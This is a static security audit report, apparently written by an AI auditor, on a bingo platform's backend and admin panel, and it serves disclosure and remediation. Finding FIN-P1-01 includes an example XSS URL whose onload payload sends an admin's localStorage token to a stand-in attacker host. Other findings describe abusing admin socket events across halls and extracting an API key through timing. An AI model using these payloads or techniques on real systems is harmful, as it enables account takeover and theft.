# Security Audit — 2026-04-28

**Scope:** Static analysis (SAST) of Spillorama bingo platform pre-pilot.
**Auditor:** Claude (read-only audit; no code modified, no commits, no scripts run beyond `npm audit`, `grep`, `find`, `ls`).
**Repo:** `/Users/tobiashaugen/Projects/Spillorama-system/.claude/worktrees/eager-ellis-a9fd5a`
**Branch:** `claude/eager-ellis-a9fd5a` (clean working tree).

---

## Executive Summary

- **Total findings: 18** (P0: 3, P1: 8, P2: 7).
- **Pilot-blocking findings: 3** (cross-hall control bypass via Socket.IO, missing security headers / CSP for an admin panel that handles cash + KYC, vulnerable transitive dep with active CVE chain).
- **Top 3 risks:**
  1. **HALL_OPERATOR cross-hall control via Socket.IO admin namespace** — a hall operator from hall A can pause / resume / force-end a game in hall B (RBAC bypass at socket layer).
  2. **No security headers anywhere** (no Helmet, no CSP, no X-Frame-Options, no HSTS) — admin panel is clickjackable, and the 27 reflected-`path` XSS sinks below have no CSP fallback.
  3. **27 reflected XSS sinks in admin-web** via `innerHTML = ... ${path}` for unknown-route fallbacks (path comes from `window.location.hash`, fully attacker-controlled). With localStorage-stored access tokens, a successful XSS = full account takeover for an admin.

**Overall posture:** the project is in significantly better shape than I expected for a pre-pilot codebase that has never had a formal audit. Money-paths are well-defended (HMAC webhooks, REPEATABLE READ + retry, idempotency keys, scrypt + timingSafeEqual on password compare, sha256-hashed opaque session tokens — no JWT in use despite what the env-var names suggest, see P2-02). Hand-rolled validation in `httpHelpers.ts` is consistent and defensive. Logger redaction is comprehensive. Image-upload validation uses magic bytes + size + dimension caps. `.env` is gitignored, no `eval`/`document.write`/`exec` of user input.

The weak spots cluster in three places: **HTTP/socket hardening hygiene** (no Helmet, no CSP, two timing-unsafe `===` API-key compares, an unauthenticated `/metrics` endpoint), **admin-web XSS via the URL hash** (a single copy-paste pattern repeated 27 times), and **socket-layer RBAC** (the admin namespace re-uses `requireAuthenticatedAdmin` without `assertUserHallScope`, contradicting the careful HTTP-layer scope guards). All of these are tractable inside the 3-week pilot window, and none require architectural changes — they're targeted fixes plus one helper to add.

---

## Methodology

**Files read for context (≤5 min):**
- `CLAUDE.md`
- `docs/architecture/ARKITEKTUR.md`
- `docs/handoff/PROJECT_HANDOFF_BRIEF_2026-04-28.md` (sections 4 + 8.4)

**Auth + session deep-dive:**
- `apps/backend/src/auth/AuthTokenService.ts`
- `apps/backend/src/auth/SessionService.ts`
- `apps/backend/src/auth/UserPinService.ts`
- `apps/backend/src/auth/TwoFactorService.ts`
- `apps/backend/src/platform/PlatformService.ts` (login, hashPassword, verifyPassword, createSession, getUserFromAccessToken — lines 670-770, 3680-3702, 4479-4494)

**RBAC + hall-scope:**
- `apps/backend/src/platform/AdminAccessPolicy.ts` (entire file — 514 lines, 97 permissions)
- `apps/backend/src/routes/adminPlayers.ts`, `adminWithdrawXml.ts`, `adminChatModeration.ts`, `paymentRequests.ts`, `agentSettlement.ts`, `agentTransactions.ts`
- `apps/backend/src/sockets/adminHallEvents.ts` (the cross-hall finding source)
- `apps/backend/src/sockets/gameEvents/chatEvents.ts` (verified fail-closed)

**Input validation, injection, file uploads:**
- `apps/backend/src/util/httpHelpers.ts` (entire — hand-rolled validators)
- `apps/backend/src/media/ImageStorageService.ts` (magic-byte detection + caps)
- `apps/backend/src/util/csvImport.ts` (header inspection)

**Webhooks & integration:**
- `apps/backend/src/payments/swedbankSignature.ts` (HMAC-SHA256 + constant-time)
- `apps/backend/src/integration/externalGameWallet.ts` (Candy wallet bridge)
- `apps/backend/src/notifications/FcmPushService.ts` (FCM cred parsing)

**Logging + secret hygiene:**
- `apps/backend/src/util/logger.ts` (pino redaction list)
- `apps/backend/src/observability/sentry.ts` (PII hashing)
- `apps/backend/src/middleware/errorReporter.ts` + `BingoEngine.ts:4307` `toPublicError`

**Frontend XSS sweep:**
- 760 `innerHTML =` uses across `apps/admin-web/src/` — manually triaged, focused on `${...}` interpolation without `escapeHtml`.
- `escapeHtml` implementations in `shell/Header.ts`, `Breadcrumb.ts`, etc.

**Greps (representative):**
- `grep -rEn 'pool\.query\(\s*`[^`]*\$\{[^}]+\}` apps/backend/src/` — 52 results, all table-name template literals validated upstream.
- `grep -rn "logger\.(info|error|warn|debug)\([^)]*\b(password|secret|jwtSecret|apiKey)\b"` — only the opt-in 2FA debug log (P2-04).
- `grep -rEn 'document\.write|eval\(|Function\(\s*"' packages/game-client/src/ apps/admin-web/src/` — zero hits.
- `grep -rEn 'Object\.assign\([^,)]+req\.body|\.\.\.req\.body|\.\.\.req\.params'` — zero hits (no prototype-pollution sinks).

**Dependency audit:**
- `npm audit --workspaces --json 2>&1 | head -200` and totals (1 high, 27 moderate, 2 low — see Dependency Audit section).

---

## Findings by Severity

### P0 — Pilot-blockers

#### **[FIN-P0-01] HALL_OPERATOR cross-hall game control via Socket.IO admin namespace**
- **Location:** `apps/backend/src/sockets/adminHallEvents.ts:220-229` (`requireAuthenticatedAdmin`), called by handlers at lines 281, 322, 356, 387, 445.
- **Description:** The socket admin namespace gates events via `requireAuthenticatedAdmin`, which only checks `canAccessAdminPermission(role, "ROOM_CONTROL_WRITE")`. `ROOM_CONTROL_WRITE` is granted to both `ADMIN` and `HALL_OPERATOR`. There is **no `assertUserHallScope` call** in `admin:room-ready`, `admin:pause-game`, `admin:resume-game`, `admin:force-end`, or `admin:hall-balance` — they accept an arbitrary `roomCode` and act on the engine. The HTTP-layer routes carefully scope by `existing.hallId` (e.g. `paymentRequests.ts:392-401` for accept), but the socket layer skipped this. This is the same gap the 2026-04-27 code review #4 documented as P0-4 ("HALL_OPERATOR mangler hallId-scope") and is confirmed still open in `docs/handoff/PROJECT_HANDOFF_BRIEF_2026-04-28.md` §7.
- **Risk:** A logged-in HALL_OPERATOR for hall A can connect via Socket.IO, call `admin:login`, then emit `admin:pause-game` / `admin:force-end` with a `roomCode` belonging to hall B. The engine pauses/ends the game in hall B mid-round. In a 4-hall pilot, a single rogue or compromised hall operator account can grief every other hall, refund-storm players, or break compliance audit trails (game-state mutated by the wrong actor).
- **Recommended fix:** In `requireAuthenticatedAdmin` (or in each event handler after `resolveHallId(roomCode)`), call `assertUserHallScope({ role: admin.role, hallId: admin.hallId ?? null }, hallId)` before the engine call. ADMIN passes through (global scope by definition). Add a regression test mirroring `chatEvents.failClosed.test.ts`.
- **Effort estimate:** **2-3 hours** (one helper, five call sites, one test file).

#### **[FIN-P0-02] No security headers — admin panel clickjackable, no CSP defense-in-depth for XSS**
- **Location:** `apps/backend/src/index.ts:336` (`app.use(cors(...))` is the entire HTTP-hardening surface). No `helmet`, no manual `setHeader` for `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`. `package.json` does not depend on `helmet`.
- **Description:** Render serves `https://spillorama-system.onrender.com/admin/` over TLS, but the response carries none of the modern security headers. Any other origin can iframe the admin panel (clickjacking — agent could be tricked into clicking "force-end-day" by a transparent overlay), and there is no CSP to mitigate the 27 reflected-XSS sinks below.
- **Risk:** Combined with FIN-P1-01 (XSS), an attacker who lures a logged-in admin to a malicious URL can hijack the session token from `localStorage` and impersonate them. Combined with no `X-Frame-Options`, an attacker can clickjack hall operators into approving bogus deposit requests.
- **Recommended fix:** Add `helmet` (single npm install, single `app.use(helmet({ contentSecurityPolicy: { ... } }))`). Tune CSP for the specific origins the admin uses (Pixi WebGL needs `'unsafe-eval'` in some configurations; verify), but at minimum: `default-src 'self'`, `frame-ancestors 'none'`, `script-src 'self'`, `connect-src 'self' wss://...`. Set HSTS with at least 1-year max-age + includeSubDomains.
- **Effort estimate:** **3-4 hours** including CSP tuning + one round of staging smoke-test (CSP misconfig is the #1 reason this gets reverted).

#### **[FIN-P0-03] High-severity transitive CVE chain in `@xmldom/xmldom <0.8.13` (4 advisories)**
- **Location:** `node_modules/@xmldom/xmldom@0.8.12` pulled transitively by `pixi.js` (verified via `package-lock.json`). `npm audit` advisories: GHSA-2v35-w6hq-6mfw (DoS via uncontrolled recursion), GHSA-f6ww-3ggp-fr8h (XML injection via DocumentType), GHSA-x6wf-f3px-wcqx (XML node injection via processing instruction), GHSA-j759-j44w-7fr8 (XML node injection via comment). All severity HIGH.
- **Description:** xmldom is parsed only client-side (game-client), and only when Pixi parses SVG / XML assets. We control all assets we ship, so the realistic exploit path is narrow (would require an attacker to inject a hostile asset URL or a stored-XSS that loads a hostile SVG). However: this is the only HIGH-severity dep CVE, and `pixi.js` is on the pilot critical path.
- **Risk:** Lower than the CVSS would suggest because attacker-controlled XML-input is limited. But if one of the other XSS sinks lands a hostile SVG into the player view, this becomes a chain.
- **Recommended fix:** Run `npm audit fix` (the report says `fixAvailable: true`). If pixi pins to the vulnerable version, the upgrade path is `pixi.js` → newer minor (8.6.x → 8.7.x or 8.8.x) — already on the roadmap per `package.json`.
- **Effort estimate:** **1 hour** to upgrade + 1 visual-regression run via Playwright.

---

### P1 — Should fix before real-money launch

#### **[FIN-P1-01] Reflected XSS via `${path}` in 27 admin-web route dispatchers**
- **Location:** 27 files matching `apps/admin-web/src/pages/*/index.ts` — confirmed in `security/index.ts:29`, `players/index.ts:41`, `cash-inout/index.ts:82`, etc.
- **Description:** Each route-tree dispatcher has the same copy-paste fallback:
  ```ts
  default:
    container.innerHTML = `<div class="box box-danger"><div class="box-body">Unknown <module> route: ${path}</div></div>`;
  ```
  `path` is `window.location.hash.replace(/^#/, "").split("?")[0]` (from `main.ts:81, 173`). It is **never** passed through `escapeHtml`. An attacker-controlled URL like `https://admin.spillorama.no/admin/#/security/<svg/onload=fetch('//attacker/'+localStorage.adminAccessToken)>` triggers when the unknown-route fallback runs.
- **Risk:** Post-login admin XSS → access-token exfiltration → full impersonation (admin tokens give 97 permissions). Works against any user with admin/operator/agent role. Pre-login is also exploitable on the login page if the dispatcher runs before auth gate (verify: `main.ts` shows hashchange wiring, the unknown-fallback may execute pre-auth on the unauth handler too).
- **Recommended fix:** Replace `${path}` with `${escapeHtml(path)}` in all 27 dispatchers. Add a lint rule (`no-restricted-syntax` for `innerHTML` template literals containing un-escaped `${...}`) so the pattern doesn't re-grow.
- **Effort estimate:** **2-3 hours** (mechanical fix + a single shared `renderUnknownRoute(container, module, path)` helper to remove the copy-paste).

#### **[FIN-P1-02] Timing-unsafe API-key comparison in Candy wallet bridge**
- **Location:** `apps/backend/src/integration/externalGameWallet.ts:16` — `if (!header || header !== \`Bearer ${apiKey}\`)`.
- **Description:** Plain string `!==` leaks key length and prefix bytes via response time. Candy backend posts to `/api/ext-wallet/balance | /debit | /credit` — these handle real money (player wallet debit/credit). An attacker who can issue many requests can extract the key character-by-character.
- **Risk:** Candy is a third-party system with shared wallet bridge — a leaked `EXT_GAME_WALLET_API_KEY` lets the attacker debit/credit any player's wallet without going through the Candy game.
- **Recommended fix:** Replace with `crypto.timingSafeEqual` over equal-length buffers (after a fast length pre-check that rejects on the cheap path without revealing the length). Pattern matches `swedbankSignature.ts:75-76`.
- **Effort estimate:** **30 min** + 1 unit test.

#### **[FIN-P1-03] In-memory rate limiter does not survive multi-instance deploy or restart**
- **Location:** `apps/backend/src/middleware/httpRateLimit.ts:60-128` (`HttpRateLimiter.check` uses `Map<string, number[]>`); `apps/backend/src/middleware/socketRateLimit.ts:60-100` (same pattern).
- **Description:** Rate-limit buckets live in process memory. On Render's "Starter" plan with one instance this is OK, but: (a) every deploy resets the counters (so an attacker can sustain a brute-force attack across deploy windows), (b) if Spillorama scales to >1 instance behind Render's load-balancer, IP-based rate limiting becomes per-instance — an attacker hitting a 30-rps total cap actually gets `30 * N` rps. The login limit (5/min/IP) loses its teeth.
- **Risk:** Login brute-force protection becomes ineffective at scale. Works for single-instance pilot but should be fixed before commercial launch.
- **Recommended fix:** Migrate to Redis-backed sliding-window counter (the Redis client is already wired for Socket.IO adapter and room state). Existing pattern: use `INCR` + `EXPIRE` with a key like `rl:{tier}:{ip}:{minute_bucket}`.
- **Effort estimate:** **1 day** (one helper + swap, test against multi-instance scenario).

#### **[FIN-P1-04] No CSRF protection — relies entirely on Bearer-only auth**
- **Location:** `apps/backend/src/index.ts` (no csurf, no SameSite cookies). Auth is via `Authorization: Bearer <token>` only — no cookies are set.
- **Description:** Today this is fine: a CSRF attack (cross-origin form POST) cannot include a custom Authorization header (browsers refuse to send it without an explicit `xhr.setRequestHeader` call, which itself triggers a CORS preflight that the backend will deny because of strict CORS-allowed-origins). However: if a future change adds cookie-based session (e.g. for embedded TV-display flow) without enabling CSRF protection, you're suddenly vulnerable. CORS allowlist + Bearer-only is brittle defense.
- **Risk:** No active risk today, but no CSRF middleware means any future cookie-based flow is unsafe by default.
- **Recommended fix:** Document the current invariant in code (`// SECURITY: All authenticated routes use Bearer-only — do NOT add cookie-based auth without CSRF tokens`). Add a runtime assertion in `getAccessTokenFromRequest` that fails closed if `req.cookies` is non-empty AND the route is state-changing.
- **Effort estimate:** **2 hours** documentation + assertion.

#### **[FIN-P1-05] Timing-unsafe ADMIN_API_TOKEN comparison on `/health/draw-engine`**
- **Location:** `apps/backend/src/index.ts:2834` — `_req.headers.authorization === \`Bearer ${process.env.ADMIN_API_TOKEN ?? ""}\``.
- **Description:** Same pattern as P1-02. `/health/draw-engine` reveals draw-engine internal state (queue depths, stuck rooms, scheduling backlog). Lower direct $ value than Candy wallet, but operational fingerprinting helps an attacker time DoS attacks.
- **Recommended fix:** `timingSafeEqual` on equal-length buffers.
- **Effort estimate:** **30 min**.

#### **[FIN-P1-06] No HALL_OPERATOR scope on `/metrics` Prometheus endpoint (and no auth at all)**
- **Location:** `apps/backend/src/index.ts:2795-2805` — `app.get("/metrics", ...)` with no auth middleware.
- **Description:** Prometheus metrics include `activeRooms`, `activePlayers`, `socketConnections`, `stuckRooms`. An attacker scraping `/metrics` over time can fingerprint hall activity, peak-load windows, and detect when ops is already-stressed (good time to attack). Render's CDN does not block this — anyone with the URL can scrape.
- **Risk:** Operational fingerprinting + competitive intelligence leak. Lower than P0 because no PII.
- **Recommended fix:** Either (a) require Bearer `ADMIN_API_TOKEN` on `/metrics` (same pattern as `/health/draw-engine`, but with timing-safe compare), or (b) restrict to localhost + Render's internal scrape IP range. Option (a) is cleaner if Render's metrics scraper supports custom headers.
- **Effort estimate:** **1 hour** including verifying Render metrics scraper config.

#### **[FIN-P1-07] `JWT_SECRET` and `JWT_REFRESH_SECRET` env vars are required but unused — operators get a false sense of security**
- **Location:** `render.yaml` lists `JWT_SECRET`, `JWT_REFRESH_SECRET` as `sync: false` (operators required to set them); `CLAUDE.md` documents them as required. **No source file references them** (verified: `grep -rn "JWT_SECRET\|JWT_REFRESH_SECRET" apps/backend/src/` returns 0 hits).
- **Description:** The codebase uses opaque random tokens (32-byte `randomBytes`, sha256-hashed in `app_sessions.token_hash`). `jsonwebtoken` is not imported anywhere. The "JWT" env vars are documentation debt from an earlier design. Operators rotating these will see no effect — they may believe they've revoked all sessions when they haven't. Conversely, a leaked `JWT_SECRET` in a screenshot or paste-bin is **not** a real risk, but the operator may panic-rotate other things.
- **Risk:** Operator confusion. Real secret-rotation requires deleting all rows in `app_sessions` (or invalidating them via DB). No documented runbook for that.
- **Recommended fix:** Remove `JWT_SECRET` / `JWT_REFRESH_SECRET` from `render.yaml` and `CLAUDE.md`. Add a note in CLAUDE.md explaining session model uses opaque tokens hashed in DB. Add a runbook in `docs/operations/` for "force-revoke all sessions" (single SQL `UPDATE app_sessions SET revoked_at = now() WHERE revoked_at IS NULL`).
- **Effort estimate:** **30 min**.

#### **[FIN-P1-08] 30-minute inactivity timeout enforced inconsistently**
- **Location:** `apps/backend/src/auth/SessionService.ts:138-195` (`touchActivity` is the only enforcer); call sites: `apps/backend/src/routes/auth.ts:171, 977, 992` (only auth-related routes).
- **Description:** `SessionService.touchActivity` correctly revokes sessions after 30 min of inactivity, but it's only called from a handful of `/api/auth/*` endpoints. Most of the API (player wallet, agent shift, etc.) calls `getUserFromAccessToken` directly, which checks only `revoked_at IS NULL AND expires_at > now()` — ignoring `last_activity_at`. So a session can be idle for 7h59m of an 8h TTL and still work for everything except auth-management endpoints.
- **Risk:** Stolen access token (e.g. via FIN-P1-01 XSS) remains usable for the full 8h TTL even if the legitimate user logged out, walked away, or died — as long as the attacker doesn't hit one of the 3 endpoints that call `touchActivity`. Direct contradiction of REQ-132.
- **Recommended fix:** Add `await sessionService.touchActivity(token)` to a global Express middleware that runs after `getUserFromAccessToken` succeeds (or fold the check into `getUserFromAccessToken` itself by joining `last_activity_at` and revoking on the same SELECT-then-UPDATE round-trip). Watch for the same on the Socket.IO connection middleware (currently sets `socket.data.user` once at handshake — long-lived sockets bypass timeout entirely).
- **Effort estimate:** **3-4 hours** + tests.

---

### P2 — Hardening / nice-to-have

#### **[FIN-P2-01] Zod is barely used — validation is hand-rolled per route**
- **Location:** Only 2 imports of `zod` in `apps/backend/src/`: `admin/DailyScheduleService.ts:18`, `scripts/legacySubGameImporter.ts:40`. The rest of the codebase uses `mustBeNonEmptyString`, `mustBeFiniteNumber`, etc. from `util/httpHelpers.ts`.
- **Description:** Hand-rolled validation is consistent and defensive in `httpHelpers.ts` (about 280 lines), but spread across 100+ route files it becomes hard to audit. Future devs will forget to call the right helper. Zod schemas would centralize the shape contract and produce better error messages.
- **Risk:** Future regressions. No active vulnerability today.
- **Recommended fix:** Adopt Zod incrementally — start with the highest-risk routes (payment-requests, admin-players, agent-cash-write). Tech-debt item, not pilot-blocking.
- **Effort estimate:** **5-8 days** for full adoption (incremental).

#### **[FIN-P2-02] Image upload uses base64 in JSON body (not multipart) — bumps memory usage by ~33%**
- **Location:** `apps/backend/src/media/ImageStorageService.ts:82` (`validateImageBase64`) — accepts base64 string in JSON body. Body limit for `/api/auth/register` is 5MB (line 347 of `index.ts`).
- **Description:** A 5MB JSON body with a base64-encoded 3.7MB image takes 5MB of RAM in Express's body parser before validation. With many concurrent registrations, memory spikes. Multipart form upload would stream to disk.
- **Risk:** Memory pressure under load. Not a security issue per se.
- **Recommended fix:** Migrate to multipart upload (`multer` or `busboy`) for image endpoints. Tech-debt item.
- **Effort estimate:** **1 day** including migration tests.

#### **[FIN-P2-03] Login rate limit (5/min/IP) is per-IP, not per-account**
- **Location:** `apps/backend/src/middleware/httpRateLimit.ts:27`.
- **Description:** Distributed brute force from a botnet (one attempt per IP per minute, but 1000 IPs) bypasses the 5/min limit. Account-lockout after N failed attempts (like the PIN service in `UserPinService.ts:155-220`) is not implemented for password login.
- **Risk:** Distributed credential stuffing. Real risk if an attacker has a leaked password list and rotates IPs.
- **Recommended fix:** Add account-level lockout: after 5 failed `verifyPassword` attempts, lock for 15 min. Pattern is in `UserPinService.ts` already — reuse the table or add `app_users.failed_login_attempts` + `app_users.locked_until`.
- **Effort estimate:** **4 hours** + tests.

#### **[FIN-P2-04] Opt-in 2FA secret logging is gated by a flag, but the flag check is in-process — easy to flip via env**
- **Location:** `apps/backend/src/auth/TwoFactorService.ts:178-180`. The flag defaults to `false` and is not wired into `index.ts`, so prod is safe today. But: a `2FA_DEBUG_LOG_SECRETS=true` env (or any future code path) could enable it without anyone noticing.
- **Description:** Defense-in-depth: even with the flag, the secret should be redacted by pino's `secret` redact path. But the log line uses `{ userId, secret }` — pino redaction on top-level `secret` field will catch it (verified in `logger.ts:54`).
- **Risk:** Low — pino redaction is the safety net. Confirmed working.
- **Recommended fix:** Remove the flag entirely (it was for development; tests don't need it). Or wire it to assert `process.env.NODE_ENV !== "production"` at construction.
- **Effort estimate:** **30 min**.

#### **[FIN-P2-05] Many `setTransaction Isolation Level ${isolation}` template-strings, but `isolation` is type-bounded — keep the type narrow**
- **Location:** `apps/backend/src/wallet/walletTxRetry.ts:130`.
- **Description:** `isolation` is typed `WalletTxIsolation = "REPEATABLE READ" | "SERIALIZABLE"` (line 36). Type-safe today, but a future widening of the type would introduce SQL-injection. Add a runtime assertion: `if (isolation !== "REPEATABLE READ" && isolation !== "SERIALIZABLE") throw`.
- **Risk:** None today. Defensive coding.
- **Recommended fix:** Add runtime guard. **15 min**.

#### **[FIN-P2-06] 27 moderate-severity transitive CVEs (uuid <8.x in artillery + firebase + google-cloud + tedious chains)**
- **Location:** `npm audit --workspaces` shows 30 vulnerabilities total: 1 high (P0-03), 27 moderate, 2 low. The moderates cluster around `uuid <8.x` (CWE-330: insecure entropy in legacy `v4()` impl) reaching via dev-deps (`artillery`, `@redocly/cli`, `@vitest/ui`) and prod-deps (`firebase-admin`, `mssql`/`tedious`).
- **Description:** The dev-dep CVEs (artillery, vitest-ui, redocly) cannot reach prod. The prod-dep CVEs (firebase-admin pulling old uuid; mssql pulling old tedious + azure stack) can reach prod but are mitigated:
  - `firebase-admin@10.x` is a major-version upgrade per the audit report — a 1-day upgrade with FCM testing.
  - `mssql`/`tedious` are used only for the OK-Bingo external-machine integration; if it's not in the pilot critical path, defer.
- **Risk:** Moderate. Most CVEs are insecure-RNG in version-4 UUID generation — non-exploitable in practice when our IDs are not security tokens.
- **Recommended fix:** Run `npm audit fix --force` in a separate PR, run full test suite + manual smoke. Plan the firebase-admin major upgrade for post-pilot.
- **Effort estimate:** **1 day** (mostly testing).

#### **[FIN-P2-07] No SBOM generation; no `npm audit` in CI**
- **Location:** `.github/workflows/` — verified no `npm audit` step.
- **Description:** CI does not gate on new vulnerable deps. The 1 high-severity CVE chain (P0-03) was probably introduced silently when pixi was upgraded. CI should run `npm audit --audit-level=high` and fail on regressions.
- **Risk:** Future supply-chain issues land silently.
- **Recommended fix:** Add `npm audit --audit-level=high` to CI. Generate SBOM via `npm sbom` (Node 22 supports it) and archive as build artifact for compliance audit-readiness.
- **Effort estimate:** **2 hours**.

---

## OWASP Top 10 (2021) Coverage Matrix

| Category | Status | Findings | Notes |
|---|---|---|---|
| **A01 Broken Access Control** | **Fail** | FIN-P0-01 | Cross-hall control via socket admin namespace. HTTP routes are well-scoped via `assertUserHallScope` / `resolveHallScopeFilter` (sampled `paymentRequests.ts`, `adminChatModeration.ts`, `adminWithdrawXml.ts` — all correct). Socket layer skipped the same guard. |
| **A02 Cryptographic Failures** | **Pass** | — | scrypt for passwords + `timingSafeEqual` (PlatformService.ts:4493). HMAC-SHA256 + constant-time for Swedbank webhook (`swedbankSignature.ts:62-77`). sha256-hashed session/auth tokens. PII hashed in Sentry. Two minor `===` API-key compares are P1-02 / P1-05, not P0. |
| **A03 Injection** | **Pass** | — | All user input goes through parameterized queries (`$1, $2, ...`). 52 template-string interpolations are all table-name / schema-name (validated upstream by `assertSchemaName` regex `/^[a-z_][a-z0-9_]*$/i`). `walletTxRetry.ts:130` SET TRANSACTION uses a type-bounded literal. No `eval` / `Function()` / shell exec of user input. |
| **A04 Insecure Design** | **Partial** | FIN-P1-07, FIN-P1-08 | Session-model is opaque-tokens-only (good), but documentation says JWT (confusing). Inactivity-timeout enforcement is incomplete by design (only on auth-routes). |
| **A05 Security Misconfiguration** | **Fail** | FIN-P0-02, FIN-P1-06 | No Helmet. No CSP. No HSTS. No X-Frame-Options. Unauth `/metrics`. CORS hardening is correct (`isProduction && !corsAllowedOriginsRaw` exits) — that part is solid. |
| **A06 Vulnerable Components** | **Partial** | FIN-P0-03, FIN-P2-06, FIN-P2-07 | 1 high + 27 moderate CVEs. Mostly transitive. Pixi-driven `xmldom` is the standout. No CI gate. |
| **A07 Authentication Failures** | **Partial** | FIN-P2-03, FIN-P1-08 | Login has 5/min IP rate-limit but no per-account lockout; PIN service has lockout but password login does not. Inactivity timeout incomplete (FIN-P1-08). Otherwise solid: scrypt, no email enumeration (forgot-password always returns success), 2FA TOTP available, BankID stubbed. |
| **A08 Software and Data Integrity** | **Pass** | — | Outbox pattern (BIN-761), hash-chain audit (BIN-764), nightly reconciliation (BIN-763), idempotency keys gate every wallet-mutating call. Webhook signatures HMAC-verified. |
| **A09 Security Logging** | **Pass** | FIN-P2-04 (low) | pino redacts password, token, accessToken, refreshToken, sessionToken, secret, ssn, personnummer, fodselsnummer, cardNumber, cvv, cvc, pan, authorization header, x-api-key. AsyncLocalStorage trace propagation. AuditLogService is comprehensive. Sentry hashes PII. |
| **A10 SSRF** | **Pass** | — | All outbound HTTP goes to fixed allowlisted hosts (Swedbank Pay, Candy backend, Sveve, Metronia). No user-controlled URLs in fetch/HTTP calls. `normalizeAbsoluteHttpUrl` (`httpHelpers.ts:181`) validates http/https only but is only used for admin-config, not for live SSRF-able paths. |

---

## Dependency Audit

`npm audit --workspaces`: **30 vulnerabilities (2 low, 27 moderate, 1 high)**.

**High-severity (1, prod-reachable via pixi.js):**
- `@xmldom/xmldom@0.8.12` — 4 CVEs (GHSA-2v35-w6hq-6mfw, GHSA-f6ww-3ggp-fr8h, GHSA-x6wf-f3px-wcqx, GHSA-j759-j44w-7fr8). Fix: `npm audit fix` (transitive upgrade via pixi.js). See FIN-P0-03.

**Moderate cluster (uuid <8.x via various dep chains):**
- `firebase-admin` → `@google-cloud/firestore` → `google-gax` → `uuid` (insecure-RNG). Fix: `firebase-admin@10.x` (semver-major).
- `mssql` → `tedious` → `@azure/identity` → `@azure/msal-node` → `uuid`. Fix: `artillery@1.7.9` (semver-major) — but only used in dev for load-testing.
- `gaxios@6.4.0-6.7.1` → `uuid`. Auto-fixable.
- `@artilleryio/int-core` → `uuid`. Dev-only.
- `@vitest/ui@<2.2.0` → `vitest`. Dev-only.
- `@redocly/cli` → `styled-components`. Dev-only.
- `@aws-sdk/xml-builder` → `fast-xml-parser`. (Not sure why we have this — may be transitive via firebase or aws-sdk somewhere.)

**Low-severity (2):**
- `@tootallnate/once <3.0.1` (CWE-705, CVSS 3.3). Transitive via firebase-admin. Auto-fixable on firebase-admin upgrade.

**Recommendation:** Run `npm audit fix` first (non-breaking). Plan `firebase-admin@10.x` upgrade as a focused day-1 post-pilot task. Add `npm audit --audit-level=high` to CI to prevent regressions.

---

## Conclusion

**Posture summary:** Spillorama is in unusually good shape for a pre-pilot codebase that has never had a formal security audit. The money-handling layer is casino-grade per the architecture research (BIN-761/762/763/764 are all working as designed). Crypto primitives are correct. Logger redaction is comprehensive. SQL queries are uniformly parameterized. The hand-rolled HTTP-input validation in `httpHelpers.ts` is consistent and defensive.

The weak spots are concentrated in three actionable buckets that can all be fixed inside the 3-week pilot window:

1. **Tighten the socket layer to match the HTTP layer** (FIN-P0-01) — 2-3 hours. This is the most important fix; it closes a real cross-hall control bypass.
2. **Add HTTP hardening + fix the XSS sinks** (FIN-P0-02 + FIN-P1-01) — 5-7 hours combined. Helmet plus a one-line `escapeHtml(path)` sweep across 27 dispatcher files (or a single shared helper).
3. **Bump pixi.js so xmldom advances past the high CVE chain** (FIN-P0-03) — 1 hour + Playwright snapshot run.

**Top 3 next steps:**
1. **Today:** Spawn the FIN-P0-01 socket-layer scope guard fix. Add a `chatEvents.failClosed.test.ts`-style regression test.
2. **This week:** Land FIN-P0-02 (Helmet + CSP) on a feature branch, smoke-test in staging for one full day before merging to main (CSP misconfig is high-risk for breaking the admin panel).
3. **This week:** Mechanical sweep of FIN-P1-01 plus FIN-P1-02 / FIN-P1-05 (`timingSafeEqual` for the two API-key compares) plus FIN-P1-07 (drop the unused JWT env vars from `render.yaml`).

After those, the P1 backlog (rate-limiter to Redis, inactivity timeout fix, account-level lockout) is post-pilot but pre-commercial-launch.

The pre-pilot pen-test recommended in the handoff brief (§8.4) should still happen, but it should focus on (a) verifying the fixes above, (b) the multi-hall socket flow end-to-end, and (c) pixi.js renderer hardening (the only client-side area not deeply audited here).
